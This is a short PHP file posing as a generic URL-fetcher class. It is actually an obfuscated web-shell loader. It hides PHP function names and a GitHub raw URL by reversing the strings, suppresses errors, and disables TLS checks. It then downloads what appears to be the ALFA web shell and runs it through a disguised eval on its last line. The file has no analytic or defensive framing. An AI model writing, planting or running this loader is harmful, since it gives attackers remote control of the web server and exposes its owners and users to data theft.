<?php
session_start();
error_reporting(0);

class UrlFetcher
{
    private $userAgent;
    
    public function __construct()
    {
        $this->userAgent = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
    }

    public function fetch($url)
    {
        $crl_exc = strrev('cexe_lruc');
        $fget = strrev('stnetnoc_teg_elif');
        $fo = strrev('nepof');
        $sget = strrev('stnetnoc_teg_maerts');
        if (function_exists($crl_exc)) {
            return $this->crlFetch($url);
        } elseif (function_exists($fget)) {
            return $fget($url);
        } elseif (function_exists($fo) && function_exists($sget)) {
            return $this->foFetch($url);
        } else {
            return false;
        }
    }

    private function crlFetch($url)
    {
        $crl_exc = strrev('cexe_lruc');
        $crl_init = strrev('tini_lruc');
        $crl_opt = strrev('tpotes_lruc');
        $crl_cls = strrev('esolc_lruc');
        $conn = $crl_init($url);
        $crl_opt($conn, CURLOPT_RETURNTRANSFER, 1);
        $crl_opt($conn, CURLOPT_FOLLOWLOCATION, 1);
        $crl_opt($conn, CURLOPT_USERAGENT, $this->userAgent);
        $crl_opt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        $crl_opt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        
        if (isset($_SESSION['nulzganteng'])) {
            $crl_opt($conn, CURLOPT_COOKIE, $_SESSION['nulzganteng']);
        }

        $url_get_contents_data = $crl_exc($conn);
        $crl_cls($conn);

        return $url_get_contents_data;
    }

    private function foFetch($url)
    {
        $sget = strrev('stnetnoc_teg_maerts');
        $fo = strrev('nepof');
        $fc = strrev('esolcf');
        $handle = $fo($url, "r");
        $url_get_contents_data = $sget($handle);
        $fc($handle);

        return $url_get_contents_data;
    }
}

$fetcher = new UrlFetcher();
$reversedUrl = strrev('php.sapyb-cne-afla/afla/niam/evihcra/sratsroxah/moc.tnetnocresubuhtig.war//:sptth');
$nulzganteng = $fetcher->fetch($reversedUrl);
/****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $nulzganteng);
